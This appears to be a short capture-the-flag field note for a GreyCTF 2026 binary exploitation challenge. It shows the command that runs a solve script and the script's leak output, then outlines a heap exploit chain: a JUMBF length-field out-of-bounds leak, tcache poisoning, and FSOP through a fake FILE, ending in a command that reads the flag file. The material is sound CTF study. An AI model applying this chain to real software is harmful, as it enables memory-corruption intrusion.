---
title: "Dbench Jumbf — Field Notes"
description: "cd /mnt/data/dbenchwork/dist-dbenchjumbf python3 /mnt/data/solvedbenchjumbflocal.py ./server"
published: "2026-05-30"
updated: "2026-05-30"
event: "GreyCTF Qualifiers 2026"
category: "Binary Exploitation"
kind: "field-note"
status: "reference"
tags: ["Binary Exploitation", "GreyCTF Qualifiers 2026", "Field notes"]
readingTime: 1
wordCount: 184
featured: false
sourcePath: "~/ctf/GreyCTF Qualifiers 2026/Pwn/dbench_jumbf/notes.md"
---

Run from the extracted challenge folder:

cd /mnt/data/dbench_work/dist-dbench_jumbf
python3 /mnt/data/solve_dbench_jumbf_local.py ./server

Confirmed output:

[+] heap leak ptr    = 0x55691c70df38
[+] old wrap chunk   = 0x55691c70db10
[+] prep src/tgt     = 0x55691c70f600 / 0x55691c70f950
[+] fake FILE        = 0x55691c70f970
[+] PIE base         = 0x55691c6db000
[+] libstdc++ base   = 0x7fa6e2400000
[+] libc base        = 0x7fa6e220c000
[+] stdout target    = 0x55691c6ef030
[+] encoded tcache fd= 0x556c4aff373f
jpeg hex> grey{fake_flag}

[+] process exited with code 2

What the exploit does:

Uses malformed APP11/JUMBF length fields to get a heap OOB leak through JSON printing.
Recovers heap, PIE, libstdc++, and libc bases.
Prepares two same-sized tcache chunks so tcache count stays nonzero after poisoning.
Overflows from a 0x340 JUMBF allocation into an adjacent freed 0x3c0 tcache chunk.
Poisons tcache to allocate at stdout - 0x10.
Overwrites the binary’s stdout copy relocation with a fake FILE.
Triggers FSOP through fwrite, pivots via _IO_wfile_jumps → setcontext, then calls:
cat /flag.txt 2>/dev/null; cat flag.txt 2>/dev/null

The README says the real flag is stored in /flag.txt on the server, so the local script also includes a flag.txt fallback for the bundled local fake flag.
